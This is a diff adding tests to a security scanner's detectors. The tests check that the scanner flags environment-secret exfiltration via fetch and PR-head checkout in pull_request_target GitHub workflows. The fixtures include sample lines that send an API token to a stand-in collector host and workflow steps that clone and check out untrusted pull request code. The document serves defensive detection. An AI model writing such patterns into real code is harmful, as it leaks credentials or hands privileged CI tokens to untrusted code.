@@ -34,6 +34,39 @@ test('js detector flags env secret exfiltration over external fetch', () => {
   assert.equal(exfilFinding.severity, 'high');
 });
 
+test('js detector flags bracket-notation env secret access in inline exfiltration', () => {
+  const findings = detectJsCapability([
+    {
+      file: 'src/api/sync.ts',
+      line: 8,
+      content:
+        "await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${process.env['API_TOKEN']}` } });"
+    }
+  ]);
+
+  assert.ok(findings.some((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern'));
+});
+
+test('js detector tracks bracket-notation env secret variables across lines', () => {
+  const findings = detectJsCapability([
+    {
+      file: 'src/api/sync.ts',
+      line: 2,
+      content: "const apiToken = process.env[\"API_TOKEN\"];"
+    },
+    {
+      file: 'src/api/sync.ts',
+      line: 6,
+      content:
+        "  await fetch('https://collector.example.com/events', { headers: { Authorization: `Bearer ${apiToken}` } });"
+    }
+  ]);
+
+  const exfilFinding = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfilFinding);
+  assert.equal(exfilFinding.line, 6);
+});
+
 test('js detector downgrades test file subprocess findings', () => {
   const findings = detectJsCapability([
     {
@@ -265,6 +298,35 @@ test('workflow detector does not flag PR head checkout without pull_request_targ
   assert.equal(findings.length, 0);
 });
 
+test('workflow detector flags custom-shell PR head checkout under pull_request_target', () => {
+  const findings = detectWorkflowPermissions([
+    {
+      file: '.github/workflows/agent.yml',
+      line: 3,
+      content: '  pull_request_target:'
+    },
+    {
+      file: '.github/workflows/agent.yml',
+      line: 18,
+      content: '          git clone https://github.com/${{ github.event.pull_request.head.repo.full_name }}'
+    },
+    {
+      file: '.github/workflows/agent.yml',
+      line: 19,
+      content: '          git checkout ${{ github.event.pull_request.head.sha }}'
+    }
+  ]);
+
+  const findingsForKind = findings.filter(
+    (finding) => finding.kind === 'capability_echo.workflow_pr_head_checkout_on_target'
+  );
+  assert.equal(findingsForKind.length, 2);
+  assert.deepEqual(
+    findingsForKind.map((finding) => finding.line).sort((a, b) => a - b),
+    [18, 19]
+  );
+});
+
 test('workflow detector flags self-hosted runners', () => {
   const findings = detectWorkflowPermissions([
     {
@@ -366,9 +428,11 @@ test('report summarizes mutable workflow action refs with a human label', () => 
         severity: 'high',
         file: '.github/workflows/agent.yml',
         line: 21,
-        subject: 'GitHub Actions PR-head checkout under pull_request_target',
-        message: 'Workflow checks out pull request head code in a pull_request_target workflow.',
-        recommendation: 'Use pull_request for untrusted PR code, or avoid checking out PR head code under pull_request_target.'
+        subject: 'GitHub Actions PR-head reference under pull_request_target',
+        message:
+          'Workflow under pull_request_target references the pull request head (SHA, ref, or repo), which can let untrusted PR code run with the elevated token context.',
+        recommendation:
+          'Use pull_request for untrusted PR code, or avoid referencing PR head SHA/ref/repo under pull_request_target.'
       },
       {
         kind: 'capability_echo.workflow_secrets_inherit',
@@ -390,7 +454,7 @@ test('report summarizes mutable workflow action refs with a human label', () => 
   assert.deepEqual(report.capabilitySummary, [
     'source secret exfiltration patterns',
     'GitHub Actions mutable action references',
-    'GitHub Actions PR-head checkout under pull_request_target',
+    'GitHub Actions PR-head reference under pull_request_target',
     'GitHub Actions inherited secrets'
   ]);
 });
